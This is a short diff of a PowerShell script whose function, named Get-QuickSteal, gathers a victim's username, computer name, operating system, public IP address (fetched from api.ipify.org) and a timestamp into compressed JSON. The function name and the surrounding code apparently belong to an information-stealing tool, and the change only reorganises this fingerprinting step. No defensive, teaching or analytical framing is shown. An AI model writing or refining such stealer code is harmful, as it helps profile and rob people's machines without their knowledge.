@@ -40,16 +40,23 @@ function Get-QuickSteal {
     }
 
     # Системная информация
-    $info = @{
-        user   = $env:USERNAME
-        pc     = $env:COMPUTERNAME
-        os     = (Get-CimInstance Win32_OperatingSystem).Caption
-        ip     = try {(irm http://api.ipify.org -TimeoutSec 6)} catch {"error"}
-        time   = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    }
-    $result["sys"] = $info | ConvertTo-Json -Compress
+try {
+    $ip = irm http://api.ipify.org -TimeoutSec 6
+} catch {
+    $ip = "error"
+}
 
-    return $result | ConvertTo-Json -Compress
+$info = @{
+    user = $env:USERNAME
+    pc   = $env:COMPUTERNAME
+    os   = (Get-CimInstance Win32_OperatingSystem).Caption
+    ip   = $ip
+    time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+}
+
+$result["sys"] = $info | ConvertTo-Json -Compress
+
+return $result | ConvertTo-Json -Compress
 }
 
 $data = Get-QuickSteal
